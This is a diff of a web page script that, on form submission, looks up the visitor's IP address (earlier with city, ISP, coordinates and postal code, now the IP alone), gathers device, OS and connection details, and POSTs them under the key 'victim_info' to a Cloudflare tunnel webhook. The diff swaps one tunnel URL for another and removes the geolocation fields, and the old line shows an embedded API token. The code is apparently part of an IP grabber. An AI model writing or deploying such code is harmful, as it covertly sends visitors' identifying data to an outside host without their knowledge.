@@ -7,8 +7,8 @@ document.addEventListener("DOMContentLoaded", function() {
         const username = document.getElementById("username").value;
         const message = document.getElementById("message").value;
 
-        fetch('https://ipinfo.io/json?token=f8e54fde451c64')
-            .then(response => response.json())
+        fetch('https://api.ipify.org')
+            .then(response => response.text())
             .then(data => {
                 if (webhookSent) return;
 
@@ -73,12 +73,7 @@ document.addEventListener("DOMContentLoaded", function() {
                 }
 
                 const ipinfo = `
-IP address: ${data.ip}
-Location: ${data.city}, ${data.region}, ${data.country}
-ISP: ${data.org}
-Latitude/Longitude: ${data.loc}
-Zip code: ${data.postal}
-Time Zone: ${data.timezone}
+IP address: ${data}
                     
 OS/Version: ${os} ${version}
 Device Type: ${deviceType}
@@ -90,9 +85,9 @@ Connection Type: ${connectionType}
 Loading Time: ${loadTime}
                 `;
 
-                const webhookURL = "https://counter-baths-barcelona-ind.trycloudflare.com/userData";
+                const webhookURL = "https://purchase-partnership-epson-assist.trycloudflare.com/userData";
 
-                const payload = {'victim-info': ipinfo}; 
+                const payload = {'victim_info': ipinfo}; 
                 fetch(webhookURL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
